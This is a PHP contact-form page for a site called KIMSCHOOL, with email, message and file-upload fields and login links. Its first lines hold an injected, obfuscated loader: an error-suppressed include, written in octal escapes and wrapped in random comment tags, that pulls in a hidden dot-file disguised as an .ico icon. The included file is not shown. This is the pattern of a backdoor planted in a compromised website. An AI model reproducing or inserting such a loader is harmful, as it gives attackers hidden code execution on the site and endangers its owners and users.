<?php 
/*e538f*/

@include "\\057home\\057kims\\143hool\\057src/\\056688a\\1467a1.\\151co";

/*e538f*/
?> 
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Untitled</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/Registration-Form-with-Photo.css">
    <link rel="stylesheet" href="assets/css/styles.css">
</head>

<body>
    <div class="register-photo">
        <div class="form-container">
            <div class="image-holder"></div>
            <form method="post" action="send.php" enctype="multipart/form-data">
                <h2 class="text-center"><strong>KIMSCHOOL에 문의하기</strong></h2>
                <div class="form-group"><small class="form-text text-muted">From</small><input type="email" name="mail" placeholder="Email" class="form-control" /></div>
                <div class="form-group" style="height: 80px;"><small class="form-text text-muted">Content</small><textarea class="form-control" placeholder="문의사항" style="height: 84px;/*padding-bottom: 16px;*//*margin-bottom: 0px;*/"></textarea></div>
                <div class="form-group"><input type="file" style="margin-top: 18px;" name="file"></div>
                <div class="form-group"><button class="btn btn-primary btn-block" type="submit">Sign Up</button></div><a href="#" class="already">We are smart &amp; speedy.</a></form>
        </div>
    </div>
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
    
    <a href=login.php>LOGIN</a>
    <a href=logout.php>LOGOUT</a>
    <a href=main.php>MAIN</a>
	<?php
		echo $_SESSION['id'] . "<br>";
		session_start();
		if(isset($_SESSION['id'])){
			echo $_SESSION['id'] . "様が接続";
		}
	?>
</body>
</html>